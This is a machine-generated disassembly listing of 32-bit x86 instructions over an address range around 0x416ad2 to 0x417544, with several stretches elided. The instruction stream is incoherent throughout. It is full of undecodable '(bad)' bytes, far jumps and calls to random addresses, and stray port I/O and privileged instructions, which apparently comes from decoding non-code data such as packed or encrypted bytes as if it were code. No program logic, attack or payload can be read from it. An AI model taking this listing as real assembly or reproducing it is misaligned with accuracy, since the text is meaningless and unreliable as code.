  416ad2:	adc    BYTE PTR [esi+ebp*2+0x1566d1dd],bh
  416ad9:	call   0x9b0f2725
  416ade:	retf   
  416adf:	pop    ecx
  416ae0:	mov    ds:0x6a90cf80,eax
  416ae5:	sbb    ebp,edi
  416ae7:	add    eax,DWORD PTR [edi]
  416ae9:	ds sahf 
  416aeb:	dec    ecx
  416aec:	je     0x416aed
  416aee:	pop    eax
  416aef:	pop    esi
  416af0:	inc    esp
  416af1:	test   DWORD PTR [eax+0x491d4a93],ebp
  416af7:	fcomp  QWORD PTR [eax+0x78]
  416afa:	call   0x1454e9da
  416aff:	nop
  416b00:	sub    ah,BYTE PTR [edi]
  416b02:	adc    DWORD PTR [edx+0x2d336344],ebx
  416b08:	lahf   
  416b09:	inc    edi
  416b0a:	cld    
  416b0b:	adc    eax,0x1438cec4
  416b10:	popa   
  416b11:	loop   0x416b59
  416b13:	push   ecx
  416b14:	mov    edx,0xfd35f7b8
  416b19:	xor    al,0xd1
  416b1b:	or     eax,0x96420495
  416b20:	mov    ecx,0xe4f12324
  416b25:	sub    bl,ah
  416b27:	out    dx,al
  416b28:	out    dx,al
  416b29:	adc    edx,DWORD PTR [eax+0x78]
  416b2c:	pusha  
  416b2d:	xchg   edi,ecx
  416b2f:	int3   
  416b30:	pop    ebp
  416b31:	or     edi,0x6231
	...
  416b93:	add    BYTE PTR [eax],al
  416b95:	add    bl,ah
  416b97:	gs push cs
  416b99:	test   DWORD PTR [esi+0x1275fbff],0x37a56b6b
  416ba3:	outs   dx,DWORD PTR ds:[esi]
  416ba4:	xor    edi,ebx
  416ba6:	mov    edi,0x70000ed
  416bab:	add    DWORD PTR [eax],eax
  416bad:	add    bl,ah
  416baf:	shl    BYTE PTR [ecx],0xb
  416bb2:	mov    fs,WORD PTR [edx-0x4a]
  416bb5:	jg     0x416b49
  416bb7:	dec    ebx
  416bb8:	inc    ecx
  416bb9:	stos   BYTE PTR es:[edi],al
  416bba:	add    eax,0x78b5e5bd
  416bbf:	das    
  416bc0:	push   ecx
  416bc1:	add    eax,DWORD PTR [ebp+0x1b99b786]
  416bc7:	arpl   WORD PTR [eax],cx
  416bc9:	ds imul ebx,ebx,0xb7abf383
  416bd0:	push   ebx
  416bd1:	xchg   ebx,eax
  416bd2:	jmp    0x78524710
  416bd7:	call   0xd7b7e91c
  416bdc:	imul   esi,DWORD PTR [edi],0x74
  416bdf:	dec    eax
  416be0:	sbb    DWORD PTR [ecx-0x75],0x393eb8c1
  416be7:	aam    0x53
  416be9:	xchg   esp,eax
  416bea:	loopne 0x416b8c
  416bec:	and    ebx,edx
  416bee:	push   esp
  416bef:	test   DWORD PTR [edx+edi*4-0x6e9b3e1],edx
  416bf6:	push   edi
  416bf7:	loop   0x416bcf
  416bf9:	pop    ss
  416bfa:	aaa    
  416bfb:	push   esi
  416bfc:	ins    BYTE PTR es:[edi],dx
  416bfd:	mov    cl,0x55
  416bff:	lea    esi,[esi]
  416c01:	mov    edi,0xec65f323
  416c06:	xchg   edi,eax
  416c07:	dec    eax
  416c08:	cdq    
  416c09:	cmp    ebx,0xffffff88
  416c0c:	call   0x4be85d8c
  416c11:	adc    eax,0x61782a8e
  416c16:	clc    
  416c17:	mov    ch,0x6a
  416c19:	xchg   edx,eax
  416c1a:	into   
  416c1b:	call   0x6787:0xbce047c0
  416c22:	test   al,0xf1
  416c24:	sub    DWORD PTR [ecx],ebp
  416c26:	rcr    DWORD PTR [edi-0x4d61f3ee],cl
  416c2c:	(bad)  
  416c2d:	or     DWORD PTR [edx-0x51],esp
  416c30:	ja     0x416c1a
  416c32:	sub    DWORD PTR [ebx+0x4ba548e3],edx
  416c38:	push   cs
  416c39:	nop
  416c3a:	dec    eax
  416c3b:	enter  0xeb9d,0x53
  416c3f:	pop    DWORD PTR [edx]
  416c41:	std    
  416c42:	addr16 adc dl,dl
  416c45:	pop    ss
  416c46:	cmp    al,0x49
  416c48:	add    eax,0xf4677d03
  416c4d:	ret    
  416c4e:	out    dx,al
  416c4f:	inc    edi
  416c50:	aam    0x1d
  416c52:	add    ah,bh
  416c54:	push   edx
  416c55:	shr    DWORD PTR [eax-0x42],0xb8
  416c59:	mov    dh,0x29
  416c5b:	imul   ebp,DWORD PTR [ecx+0x4a],0xfe68130e
  416c62:	sbb    DWORD PTR [edi+0x4ff85e3d],0xe782dbf7
  416c6c:	jno    0x416c78
  416c6e:	dec    edx
  416c6f:	call   0x8a008521
  416c74:	shl    BYTE PTR [eax+0x62bd1e8a],1
  416c7a:	ror    DWORD PTR [eax+0x72],1
  416c7d:	mov    eax,ds:0xff004f56
  416c82:	daa    
  416c83:	fcmovne st,st(6)
  416c85:	jl     0x416ce2
  416c87:	lock fadd DWORD PTR [edx-0x14]
  416c8b:	icebp  
  416c8c:	push   0xf86bba9d
  416c91:	jne    0x416cbf
  416c93:	mov    bl,0xc
  416c95:	push   0xffffffad
  416c97:	mov    cl,0x2e
  416c99:	inc    eax
  416c9a:	xor    eax,0x86cbc7e8
  416c9f:	daa    
  416ca0:	mov    ds:0xf274fd7e,al
  416ca5:	aaa    
  416ca6:	inc    ebx
  416ca7:	fild   DWORD PTR [edi-0x74]
  416caa:	jge    0x416d2a
  416cac:	mov    ebx,0x590fc32
  416cb1:	lea    ebp,[edi+0x1b]
  416cb4:	call   0x0:0x0
	...
  416d13:	add    BYTE PTR [eax],al
  416d15:	add    BYTE PTR [ecx],ah
  416d17:	xchg   ebx,eax
  416d18:	mov    DWORD PTR [edi-0x60d84045],ebp
  416d1e:	or     DWORD PTR ds:0xfe7080c9,edi
  416d24:	adc    dl,BYTE PTR [ecx]
  416d26:	(bad)  
  416d27:	out    dx,al
  416d28:	add    BYTE PTR [eax],al
  416d2a:	pop    es
  416d2b:	add    DWORD PTR [eax],eax
  416d2d:	add    BYTE PTR [edx-0x6b4bd51d],ch
  416d33:	jmp    FWORD PTR ds:0x34af12e1
  416d39:	xchg   esp,eax
  416d3a:	cld    
  416d3b:	mov    ah,0x47
  416d3d:	test   eax,0x61aa4577
  416d42:	lods   eax,DWORD PTR gs:[esi]
  416d44:	cmp    al,0x36
  416d46:	jp     0x416da5
  416d48:	sub    eax,edi
  416d4a:	cmc    
  416d4b:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  416d4d:	or     eax,0x26e19afd
  416d52:	sub    DWORD PTR [edi+0x13],0xffffffa7
  416d56:	mov    ebp,0x6fc5acc2
  416d5b:	jcxz   0x416cfb
  416d5e:	or     DWORD PTR [ecx-0x3078758d],esi
  416d64:	adc    esi,eax
  416d66:	pusha  
  416d67:	popa   
  416d68:	pop    ecx
  416d69:	jne    0x416d7d
  416d6b:	jmp    0xcbec:0xd733f81e
  416d72:	xor    DWORD PTR [esp+edi*4-0x33443d22],ecx
  416d79:	sub    BYTE PTR [ebx-0x681ed39a],0xac
  416d80:	or     al,ch
  416d82:	mov    bh,0x6c
  416d84:	adc    al,0xa5
  416d86:	stc    
  416d87:	fimul  WORD PTR [ecx]
  416d89:	ss call 0x7becda56
  416d8f:	fcmovnu st,st(7)
  416d91:	push   0x2e6b8270
  416d96:	mov    bh,cl
  416d98:	mov    dh,0xfa
  416d9a:	test   al,0x89
  416d9c:	sub    BYTE PTR ds:0xd90335a2,dh
  416da2:	int    0x82
  416da4:	add    DWORD PTR [esi],edi
  416da6:	in     eax,dx
  416da7:	push   esi
  416da8:	gs pop ecx
  416daa:	add    edi,edx
  416dac:	push   cs
  416dad:	lds    esi,FWORD PTR [eax+0x2f]
  416db0:	or     esi,DWORD PTR [ebp-0x21]
  416db3:	cdq    
  416db4:	jmp    FWORD PTR [ecx-0x15]
  416db7:	repnz push 0x5196b717
  416dbd:	add    edi,DWORD PTR [esi-0x2190b185]
  416dc3:	jp     0x416d8f
  416dc5:	adc    DWORD PTR [esp+edi*2-0x17f1d106],0x4b
  416dcd:	and    esi,eax
  416dcf:	addr16 imul ecx,ecx,0xfffffff5
  416dd3:	nop
  416dd4:	add    BYTE PTR [eax],0x2b
  416dd7:	popf   
  416dd8:	mov    bh,0x6d
  416dda:	pop    edi
  416ddb:	mov    cl,0xbf
  416ddd:	(bad)  
  416dde:	test   ebx,0x11c1e8a1
  416de4:	mov    dh,dh
  416de6:	add    DWORD PTR [edi-0x2],esp
  416de9:	out    dx,al
  416dea:	es xchg esi,eax
  416dec:	adc    ecx,ebx
  416dee:	xor    al,0xe6
  416df0:	bound  edx,QWORD PTR [ebx+0x1d03e1a1]
  416df6:	push   esi
  416df7:	xchg   esp,esi
  416df9:	addr16 mov al,0x2e
  416dfc:	inc    esi
  416dfd:	(bad)  
  416dfe:	adc    DWORD PTR [ebx+0x14],esp
  416e01:	addr16 imul edi,ebx,0x44
  416e05:	test   DWORD PTR [eax-0x27eb4d30],esp
  416e0b:	fstp   TBYTE PTR [edx]
  416e0d:	dec    ebp
  416e0e:	adc    BYTE PTR [ecx],cl
  416e10:	lods   eax,DWORD PTR ds:[esi]
  416e11:	jle    0x416dfd
  416e13:	xchg   BYTE PTR [ecx-0x13],ah
  416e16:	nop
  416e17:	xchg   ecx,eax
  416e18:	aam    0x74
  416e1a:	jp     0x416dfc
  416e1c:	not    edx
  416e1e:	inc    eax
  416e1f:	dec    edx
  416e20:	mov    ecx,0x7802d05d
  416e25:	jg     0x416e4a
  416e27:	fldcw  WORD PTR [ebp-0x65]
  416e2a:	retf   
  416e2b:	out    0xbc,eax
  416e2d:	xchg   ebx,eax
  416e2e:	repnz pop es
  416e30:	ss push esp
  416e32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e33:	xor    DWORD PTR [ecx+0x0],ecx
	...
  416e96:	mov    edi,0xae6d8e19
  416e9b:	(bad)  
  416e9c:	(bad)  
  416e9d:	(bad)  
  416e9f:	fstp   QWORD PTR [edx+ecx*8+0x7b6a1584]
  416ea6:	int    0xef
  416ea8:	add    BYTE PTR [eax],al
  416eaa:	pop    es
  416eab:	add    DWORD PTR [eax],eax
  416ead:	add    BYTE PTR [edx+0x67ee8f35],bh
  416eb3:	jno    0x416e6c
  416eb5:	sahf   
  416eb6:	sub    ah,al
  416eb8:	inc    ecx
  416eb9:	pop    ss
  416eba:	mov    edx,0x6d53fd7f
  416ebf:	pop    ss
  416ec0:	imul   esp,DWORD PTR [edx-0x6728f3a],0x73
  416ec7:	xlat   BYTE PTR ds:[ebx]
  416ec8:	or     eax,edx
  416eca:	dec    edx
  416ecb:	daa    
  416ecc:	popf   
  416ecd:	ja     0x416e5f
  416ecf:	out    0x41,al
  416ed1:	jno    0x416ef4
  416ed3:	or     DWORD PTR [ecx-0x2b923863],esp
  416ed9:	ds repz addr16 xchg cl,al
  416ede:	js     0x416eeb
  416ee0:	loop   0x416e80
  416ee2:	jae    0x416ebb
  416ee4:	jmp    0x416f0a
  416ee6:	pop    es
  416ee7:	adc    ch,0x61
  416eea:	loopne 0x416ec6
  416eec:	push   0x8373408e
  416ef1:	stos   BYTE PTR es:[edi],al
  416ef2:	mov    WORD PTR [edi-0x4c],ds
  416ef5:	cld    
  416ef6:	clc    
  416ef7:	fbstp  TBYTE PTR [edi]
  416ef9:	arpl   WORD PTR [eiz*8+0x1a3d3b65],ax
  416f00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f01:	ffree  st(1)
  416f03:	in     eax,0x87
  416f05:	mov    edi,0x201dcdd
  416f0a:	sub    esi,edx
  416f0c:	sub    dh,ch
  416f0e:	jmp    0xb60f:0x659d5c45
  416f15:	enter  0x865d,0xf
  416f19:	fstp   st(6)
  416f1b:	sub    esi,DWORD PTR [ebx+0x61]
  416f1e:	cmp    BYTE PTR [ebx+0x39],cl
  416f21:	rcl    BYTE PTR [eax+edx*2-0x13],0xa0
  416f26:	iret   
  416f27:	and    BYTE PTR [ebx+0x4498751f],dl
  416f2d:	aaa    
  416f2e:	or     eax,0xa584f903
  416f33:	or     BYTE PTR [ecx+0x8],bl
  416f36:	(bad)  
  416f37:	push   ss
  416f38:	mov    al,0x80
  416f3a:	arpl   WORD PTR [edi],bp
  416f3c:	iret   
  416f3d:	(bad)  
  416f3e:	jnp    0x416f89
  416f40:	(bad)  [edi]
  416f42:	imul   ebx,DWORD PTR [esi+ecx*8-0x293a612d],0xffffffb2
  416f4a:	adc    bh,dh
  416f4c:	cmp    edi,DWORD PTR [esi]
  416f4e:	lods   eax,DWORD PTR ds:[esi]
  416f4f:	or     eax,0xe16913b6
  416f54:	push   es
  416f55:	dec    ebx
  416f56:	scas   al,BYTE PTR es:[edi]
  416f57:	sahf   
  416f58:	cmp    ebp,DWORD PTR [esi-0x24]
  416f5b:	or     DWORD PTR ds:[esi+0x5aa4ea01],ebp
  416f62:	or     al,0x2d
  416f64:	lock and DWORD PTR [edx+ecx*2],ebx
  416f68:	lock nop
  416f6a:	mov    ebp,0x9ded6867
  416f6f:	or     eax,0x83bbd1ae
  416f74:	sahf   
  416f75:	push   0xf3c462ce
  416f7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f7b:	pop    ebx
  416f7c:	push   ds
  416f7d:	or     al,0x43
  416f7f:	in     al,dx
  416f80:	add    ah,BYTE PTR [ecx-0x3]
  416f83:	ins    DWORD PTR es:[edi],dx
  416f84:	test   eax,0xcfe58e54
  416f89:	sbb    eax,DWORD PTR [edi-0x4d5ff82e]
  416f8f:	(bad)  
  416f90:	mov    eax,ds:0x878ead06
  416f95:	outs   dx,BYTE PTR ds:[esi]
  416f96:	retf   
  416f97:	nop
  416f98:	stos   DWORD PTR es:[edi],eax
  416f99:	add    cl,dh
  416f9b:	or     BYTE PTR [ecx],dl
  416f9d:	jg     0x416f23
  416f9f:	pop    eax
  416fa0:	or     dh,BYTE PTR [ebp+ecx*8+0x11]
  416fa4:	aas    
  416fa5:	mov    edx,edi
  416fa7:	and    dl,bh
  416fa9:	aas    
  416faa:	pop    esp
  416fab:	leave  
  416fac:	std    
  416fad:	psadbw mm6,mm6
  416fb0:	sbb    ebx,DWORD PTR [esi+0xa1f15]
	...
  417016:	jbe    0x417045
  417018:	push   ebp
  417019:	inc    ecx
  41701a:	pop    edi
  41701b:	jns    0x417093
  41701d:	aas    
  41701e:	lods   al,BYTE PTR ds:[esi]
  41701f:	fmul   QWORD PTR [eax-0x50]
  417022:	adc    al,dl
  417024:	outs   dx,DWORD PTR ds:[esi]
  417025:	mov    esp,0xf0d4
  41702a:	pop    es
  41702b:	add    DWORD PTR [eax],eax
  41702d:	add    BYTE PTR [ebp-0x18],ah
  417030:	xchg   ecx,eax
  417031:	sbb    bh,ah
  417033:	xchg   edx,eax
  417034:	adc    esp,DWORD PTR [edi]
  417036:	sub    al,0xc7
  417038:	jno    0x416ff9
  41703a:	jle    0x417052
  41703c:	data16 mov al,ds:0x417c18c0
  417042:	jp     0x4170ab
  417044:	cmp    edx,0x2ffa6a31
  41704a:	gs out 0x2e,eax
  41704d:	mov    ds:0xbaa61d1f,eax
  417052:	ins    BYTE PTR es:[edi],dx
  417053:	sbb    DWORD PTR [ebx],esi
  417055:	das    
  417056:	push   edx
  417057:	xchg   ecx,eax
  417058:	std    
  417059:	lea    esp,[esi]
  41705b:	scas   eax,DWORD PTR es:[edi]
  41705c:	jecxz  0x417011
  41705e:	sar    DWORD PTR [esi],1
  417060:	and    cl,ah
  417062:	fild   DWORD PTR [eax]
  417064:	pop    edi
  417065:	and    BYTE PTR [esi+0x699e43b9],dl
  41706b:	add    esp,DWORD PTR [ecx+0x7]
  41706e:	sub    BYTE PTR [eax+0x654eac6b],bl
  417074:	test   DWORD PTR [eax+0x5c56056c],0x986e57c5
  41707e:	fninit 
  417080:	retf   0xe29c
  417083:	jmp    0x4f80a148
  417088:	(bad)  
  417089:	fisttp QWORD PTR [edi+0x43096cd6]
  41708f:	cmp    BYTE PTR [esi],0x4c
  417092:	or     DWORD PTR ds:0xa640cee5,0x12
  417099:	lea    edi,[edi-0x55]
  41709c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41709d:	into   
  41709e:	pop    ss
  41709f:	call   0xfe6900d
  4170a4:	adc    al,0xa4
  4170a6:	push   0xb5cf3b57
  4170ab:	fisubr WORD PTR [esi-0x64]
  4170ae:	dec    ebx
  4170af:	adc    eax,0x7441f5d0
  4170b4:	data16 out 0xe5,al
  4170b7:	dec    eax
  4170b8:	xchg   edx,eax
  4170b9:	(bad)  
  4170ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170bb:	mov    edi,0x931a1b72
  4170c0:	mov    ah,0xad
  4170c2:	cwde   
  4170c3:	fst    DWORD PTR [esi-0x43]
  4170c6:	add    eax,DWORD PTR [ecx+0x7c8412a7]
  4170cc:	loope  0x41714d
  4170ce:	imul   edx,DWORD PTR [ebx+0x76],0x9ece3bb9
  4170d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170d6:	xchg   ecx,eax
  4170d7:	adc    DWORD PTR [edx-0x69],ebx
  4170da:	test   DWORD PTR [esi],ecx
  4170dc:	dec    edi
  4170dd:	jl     0x4170d7
  4170df:	retf   
  4170e0:	add    esi,0xa17089b
  4170e6:	push   0x4a3676b6
  4170eb:	add    al,0xbc
  4170ed:	sbb    eax,0xf940a468
  4170f2:	loopne 0x417146
  4170f4:	outs   dx,DWORD PTR ds:[esi]
  4170f5:	jmp    0x417108
  4170f7:	inc    ebx
  4170f8:	in     al,dx
  4170f9:	or     al,BYTE PTR [edx]
  4170fb:	add    edi,DWORD PTR [ebp+0x47b1c4ad]
  417101:	sbb    eax,0xc0533cf5
  417106:	inc    edx
  417107:	stos   DWORD PTR es:[edi],eax
  417108:	add    eax,0x1f10ecbf
  41710d:	sbb    BYTE PTR [ebx],dl
  41710f:	cwde   
  417110:	push   eax
  417111:	fild   QWORD PTR [esi-0x14f71fe9]
  417117:	adc    BYTE PTR [ebx],0x3
  41711a:	sahf   
  41711b:	outs   dx,BYTE PTR ds:[esi]
  41711c:	inc    ebx
  41711d:	xchg   edi,eax
  41711e:	std    
  41711f:	mov    ebx,0xcd553181
  417124:	out    0x39,eax
  417126:	pop    es
  417127:	out    0xb,eax
  417129:	inc    edx
  41712a:	clc    
  41712b:	push   ecx
  41712c:	add    ebp,DWORD PTR [esi]
  41712e:	(bad)  
  417130:	test   DWORD PTR [edi+0x217547],ecx
	...
  417196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417197:	sbb    DWORD PTR [eax+0x1a],esi
  41719a:	(bad)  
  41719b:	jnp    0x41718b
  41719d:	mov    ebp,0x5dd8ff3
  4171a2:	dec    edx
  4171a3:	stc    
  4171a4:	sbb    BYTE PTR [ebx-0x25],0xf1
  4171a8:	add    BYTE PTR [eax],al
  4171aa:	pop    es
  4171ab:	add    DWORD PTR [eax],eax
  4171ad:	add    BYTE PTR [esi-0x6f],al
  4171b0:	cld    
  4171b1:	repz inc edx
  4171b3:	(bad)  
  4171b4:	bound  esp,QWORD PTR [edx]
  4171b6:	popa   
  4171b7:	jecxz  0x4171e9
  4171b9:	dec    edx
  4171ba:	mov    bh,0xdf
  4171bc:	cmp    al,0xd8
  4171be:	pop    ss
  4171bf:	push   esp
  4171c0:	xor    BYTE PTR [eax],0xfd
  4171c3:	pop    esi
  4171c4:	fldenv [eax+0x70]
  4171c7:	mov    al,ds:0xa368a3a0
  4171cc:	lods   eax,DWORD PTR ds:[esi]
  4171cd:	and    BYTE PTR [edx-0xefb90f6],0xfa
  4171d4:	mov    bh,0x41
  4171d6:	mov    ah,0x7a
  4171d8:	dec    esp
  4171d9:	or     eax,0x8e75aaab
  4171de:	xchg   esi,eax
  4171df:	cmp    al,0x34
  4171e1:	jns    0x417250
  4171e3:	push   ds
  4171e4:	loopne 0x417167
  4171e6:	xchg   esi,eax
  4171e7:	popa   
  4171e8:	push   ds
  4171e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171ea:	out    dx,al
  4171eb:	jnp    0x4171d2
  4171ed:	outs   dx,BYTE PTR ds:[esi]
  4171ee:	and    dh,BYTE PTR [ebp+0x69e98f26]
  4171f4:	data16 mov al,ds:0xe7e04a57
  4171fa:	add    ah,BYTE PTR [ecx-0x104f442a]
  417200:	ror    BYTE PTR [ebp-0x7f],0xae
  417204:	repz cld 
  417206:	in     al,dx
  417207:	fisttp QWORD PTR [edx+eax*4]
  41720a:	inc    ebp
  41720b:	dec    eax
  41720c:	dec    edx
  41720d:	dec    esp
  41720e:	push   edx
  41720f:	clc    
  417210:	(bad)  
  417211:	adc    al,0x5e
  417213:	jl     0x417277
  417215:	lds    esp,FWORD PTR [edi-0x6f83f9d5]
  41721b:	ldmxcsr DWORD PTR [ebp-0x2a642541]
  417222:	aaa    
  417223:	inc    ecx
  417224:	test   DWORD PTR [ebx+0x11bad12f],0x3ab7078
  41722e:	out    0x54,al
  417230:	cmp    eax,0x98e6de80
  417235:	shl    DWORD PTR [edx],0xe2
  417238:	dec    edi
  417239:	sar    BYTE PTR [eax],1
  41723b:	push   cs
  41723c:	mov    ebx,DWORD PTR [ecx+0x4059d105]
  417242:	adc    eax,0x92e7f911
  417247:	(bad)  
  417248:	call   0x4677:0xf9bab906
  41724f:	and    bl,BYTE PTR [ecx-0x77]
  417252:	iret   
  417253:	in     eax,0x35
  417255:	xchg   esp,eax
  417256:	pop    eax
  417257:	xchg   ebx,eax
  417258:	inc    esi
  417259:	fcomp  QWORD PTR [edi+0x65]
  41725c:	cmc    
  41725d:	jle    0x417254
  41725f:	fsubp  st(4),st
  417261:	mov    ah,0xab
  417263:	inc    edx
  417264:	xor    DWORD PTR [eax+eax*1],ecx
  417267:	pop    edi
  417268:	sbb    eax,0xc3d09e9c
  41726d:	lods   al,BYTE PTR ds:[esi]
  41726e:	adc    DWORD PTR [ecx+0x13],eax
  417271:	pop    es
  417272:	dec    ebx
  417273:	mov    ds:0xed32c32f,eax
  417278:	adc    BYTE PTR [edi+0x60290fc6],bh
  41727e:	mov    bh,0x1d
  417280:	cwde   
  417281:	dec    edx
  417282:	test   eax,0x6891254d
  417287:	push   es
  417288:	and    BYTE PTR [esi-0x4f],dl
  41728b:	and    bl,cl
  41728d:	push   ebp
  41728e:	jnp    0x417254
  417290:	sub    eax,0x5cdaaf70
  417295:	pop    esi
  417296:	retf   0x74b
  417299:	cs leave 
  41729b:	push   0x2db02339
  4172a0:	or     BYTE PTR [edi+0x7cd95493],bl
  4172a6:	xlat   BYTE PTR ds:[ebx]
  4172a7:	mov    eax,0x9db8b782
  4172ac:	imul   ecx,DWORD PTR [eax+0x39],0x52
  4172b0:	dec    ebp
  4172b1:	mov    ds:0xb4e33e,eax
	...
  417316:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0xe5bf4abf
  417321:	test   DWORD PTR [ebx],ebx
  417323:	jmp    0xf32405ba
  417328:	add    BYTE PTR [eax],al
  41732a:	pop    es
  41732b:	add    DWORD PTR [eax],eax
  41732d:	add    BYTE PTR [edi+0x18],dl
  417330:	test   DWORD PTR [edi],ebx
  417332:	or     ebp,esp
  417334:	imul   ecx,eax,0x74
  417337:	ret    0x1950
  41733a:	xor    ebp,0x2f
  41733d:	retf   
  41733e:	retf   
  41733f:	(bad)  
  417340:	sub    eax,0x4f5a5bc9
  417345:	rcl    DWORD PTR [edx-0x4f],1
  417348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417349:	inc    ebx
  41734a:	jno    0x4173bc
  41734c:	lods   al,BYTE PTR ds:[esi]
  41734d:	xor    ebp,DWORD PTR [ebx+0x60]
  417350:	jg     0x417314
  417352:	jo     0x41737b
  417354:	lods   eax,DWORD PTR ds:[esi]
  417355:	cmp    ah,BYTE PTR [ebx+0x6d85a1fa]
  41735b:	and    bh,0x8d
  41735e:	xor    al,0x4
  417360:	jbe    0x4172fa
  417362:	gs (bad) 
  417364:	cdq    
  417365:	shr    bl,0x39
  417368:	imul   BYTE PTR [eax+0xcf06811]
  41736e:	fisttp DWORD PTR [esi-0x32942910]
  417374:	jg     0x41735e
  417376:	outs   dx,DWORD PTR fs:[esi]
  417378:	mov    al,0x24
  41737a:	mov    WORD PTR [eax+0x7d],es
  41737d:	retf   
  41737e:	sub    BYTE PTR [ebp+0x5df0ac16],dh
  417384:	jbe    0x41738e
  417386:	(bad)  
  417387:	fistp  DWORD PTR ds:0xadbb608a
  41738d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41738e:	or     BYTE PTR [ebx],bh
  417390:	das    
  417391:	call   0xed127718
  417396:	sbb    al,0x78
  417398:	inc    eax
  417399:	or     eax,0x9bcb5217
  41739e:	adc    BYTE PTR [ebx+0x7f27b341],ch
  4173a4:	push   cs
  4173a5:	jge    0x41732c
  4173a7:	ficom  WORD PTR [edx+0x2a]
  4173aa:	dec    esp
  4173ab:	outs   dx,BYTE PTR ds:[esi]
  4173ac:	mov    dl,0xa8
  4173ae:	scas   eax,DWORD PTR es:[edi]
  4173af:	fwait
  4173b0:	mov    ebp,0x71a79949
  4173b5:	retf   
  4173b6:	jno    0x41734d
  4173b8:	push   es
  4173b9:	inc    eax
  4173ba:	xor    DWORD PTR [esi],ecx
  4173bc:	push   ecx
  4173bd:	or     ecx,DWORD PTR [eax+0x3c]
  4173c0:	pop    ebp
  4173c1:	adc    al,0xf5
  4173c3:	and    al,0xf7
  4173c5:	call   0xbabb:0x5acf0c64
  4173cc:	cmp    BYTE PTR [ebp-0x58],ch
  4173cf:	adc    ch,BYTE PTR [eax+0x35c8406a]
  4173d5:	fadd   QWORD PTR [ecx+0x611c2a16]
  4173db:	inc    ebp
  4173dc:	dec    edi
  4173dd:	dec    eax
  4173de:	push   cs
  4173df:	inc    DWORD PTR [eax-0x1f]
  4173e2:	adc    bl,BYTE PTR [edx-0x43e6ea14]
  4173e8:	sub    edi,DWORD PTR [ecx]
  4173ea:	(bad)  
  4173eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173ec:	repz mov al,ds:0x81913c5e
  4173f2:	sub    DWORD PTR ds:0x3a67b559,0x77
  4173f9:	sti    
  4173fa:	xchg   DWORD PTR [edx-0x27],edx
  4173fd:	out    dx,al
  4173fe:	mov    al,ds:0x4818b977
  417403:	or     ebx,DWORD PTR [ebp-0x18]
  417406:	xor    al,0x36
  417408:	xor    al,BYTE PTR [bp+0x3d]
  41740c:	cmc    
  41740d:	iret   
  41740e:	cs and eax,0x65575d53
  417414:	repz aam 0x3d
  417417:	adc    edi,DWORD PTR [ebx-0x92a0497]
  41741d:	pop    ebx
  41741e:	dec    eax
  41741f:	imul   esi,DWORD PTR [ebx],0xffffff97
  417422:	sbb    ah,BYTE PTR [eax-0x7c96aa6b]
  417428:	les    ebx,FWORD PTR [eax-0x25bede8a]
  41742e:	dec    esp
  41742f:	or     DWORD PTR [edi-0x52],ebx
  417432:	repz dec dx
	...
  417495:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  41749b:	fdivr  st(7),st
  41749d:	mov    edi,0x6bda61d2
  4174a2:	into   
  4174a3:	xlat   BYTE PTR ds:[ebx]
  4174a4:	cmp    cl,ch
  4174a6:	jmp    0x741759e
  4174ab:	add    DWORD PTR [eax],eax
  4174ad:	add    BYTE PTR [ecx],ah
  4174af:	imul   DWORD PTR [ebp+ecx*4+0x5f]
  4174b3:	stc    
  4174b4:	rcl    DWORD PTR [edx-0x72],cl
  4174b7:	in     al,dx
  4174b8:	repnz das 
  4174ba:	outs   dx,BYTE PTR ds:[esi]
  4174bb:	mov    bl,0xbd
  4174bd:	xchg   ebp,eax
  4174be:	outs   dx,DWORD PTR ds:[esi]
  4174bf:	jno    0x417486
  4174c1:	ins    DWORD PTR es:[edi],dx
  4174c2:	jle    0x4174f5
  4174c4:	cmp    dl,BYTE PTR [ebp+0x44]
  4174c7:	mov    ch,0xdf
  4174c9:	je     0x4174b0
  4174cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174cc:	rcl    BYTE PTR [esi-0x13d34fc0],1
  4174d2:	dec    edx
  4174d4:	pop    esi
  4174d5:	mov    al,ds:0x18fc5071
  4174da:	or     bl,BYTE PTR [ebp-0x7d]
  4174dd:	cmp    edx,DWORD PTR [edx]
  4174df:	or     edx,ecx
  4174e1:	(bad)  
  4174e2:	jle    0x41747a
  4174e4:	or     DWORD PTR [edi+0xf8f1186],0x87599701
  4174ee:	fisubr DWORD PTR [ecx-0x25]
  4174f1:	jbe    0x4174e2
  4174f3:	outs   dx,DWORD PTR ds:[esi]
  4174f4:	(bad)  
  4174f5:	bound  esp,QWORD PTR [ecx-0x8]
  4174f8:	loopne 0x41753b
  4174fa:	adc    bl,dl
  4174fc:	mov    eax,0xcb5dd554
  417501:	mov    WORD PTR [esi+esi*1+0x40],?
  417505:	dec    esi
  417506:	push   edx
  417507:	push   ds
  417508:	inc    esi
  417509:	rcr    DWORD PTR [edx+ecx*1-0x7e2b4d36],1
  417510:	sti    
  417511:	hlt    
  417512:	xor    BYTE PTR [esi-0x779ab7e3],0xe6
  417519:	les    ebx,FWORD PTR [esi-0x32]
  41751c:	adc    DWORD PTR [esi+0x4b16fc14],edx
  417522:	xor    bl,BYTE PTR [ebx+0x39]
  417525:	sub    DWORD PTR [ebx],edx
  417527:	mov    bh,0x1e
  417529:	mov    WORD PTR [esi],ss
  41752b:	mov    ds:0x78347e11,eax
  417530:	inc    ebx
  417531:	ret    
  417532:	push   eax
  417533:	addr16 jg 0x417551
  417536:	bound  esi,QWORD PTR [ebx+0x6a]
  417539:	cli    
  41753a:	outs   dx,DWORD PTR ds:[esi]
  41753b:	aas    
  41753c:	jae    0x417519
  41753e:	push   eax
  41753f:	sub    BYTE PTR [ebx+esi*4+0x32],0xf4
  417544:	retf   0x68a1
